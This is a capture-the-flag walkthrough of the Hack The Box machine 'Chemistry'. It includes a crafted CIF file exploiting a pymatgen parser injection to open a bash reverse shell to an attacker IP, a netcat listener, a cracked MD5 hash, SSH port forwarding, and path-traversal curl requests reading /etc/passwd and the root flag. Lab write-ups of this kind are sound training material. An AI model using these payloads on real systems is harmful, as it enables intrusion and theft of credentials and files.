# HTB - Chemistry

**IP Address:** `10.10.11.38`  
**OS:** Ubuntu  
**Difficulty:** Easy  
**Tags:** Flask, File Upload, Python Werkzeug, Reverse Shell, Hash Cracking, LFI

---

## 1. Port Scanning

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.10.11.38
```

**Open Ports:**

- `22/tcp` → SSH (OpenSSH 8.2p1)
- `5000/tcp` → HTTP (Werkzeug 3.0.3 Python/3.9.5)

---

## 2. Web Enumeration

### 2.1 Basic Access

Visited `http://10.10.11.38:5000`.  
Found a Flask-based app: **"Chemistry CIF Analyzer"**

Options to `Register` and `Login`.  
Created user: `banana:banana`.

### 2.2 Upload Functionality

After login, users can upload `.cif` (Crystallographic Information Format) files.

Discovered an RCE vulnerability in `pymatgen` CIF parser:  
[GHSA-vgv8-5cpj-qj2f](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f)

Crafted malicious CIF file with payload:

```cif
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__(*[
().__class__.__mro__[1]]+["__sub" + "classes__"])() if d.__name__ == "BuiltinImporter"][0].load_module(
"os").system("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.14.105/9090 0>&1\'");0,0,0'
```

---

## 3. Reverse Shell Access

On attacker's machine:

```bash
nc -lnvp 9090
```

Uploaded the malicious `.cif` file and got a reverse shell from the server.  
Found user data in the instance's directory.

---

## 4. Password Extraction & Cracking

Located the database and extracted hash for user `rosa`:

```
63ed86ee9f624c7b14f1d4f43dc251a5
```

Used [CrackStation](https://crackstation.net/) to crack it.  
✅ Password: `molteniron`

SSH login with:

```bash
ssh rosa@10.10.11.38
```

🏁 **User flag obtained**

---

## 5. Privilege Escalation

### 5.1 Port Forwarding

Rosa's user had access to a local service at `127.0.0.1:9999`.  
Used SSH to port-forward:

```bash
ssh -L 9999:127.0.0.1:9999 rosa@10.10.11.38
```

### 5.2 Exploiting LFI

Accessed:

```bash
curl --path-as-is http://127.0.0.1:9999
```

Then tried:

```bash
curl --path-as-is http://127.0.0.1:9999/assets/../../../etc/passwd
```

✅ Confirmed Local File Inclusion

Accessed root flag:

```bash
curl --path-as-is http://127.0.0.1:9999/assets/../../../root/root.txt
```

🏁 **Root flag obtained**

---

# ✅ MACHINE COMPLETE
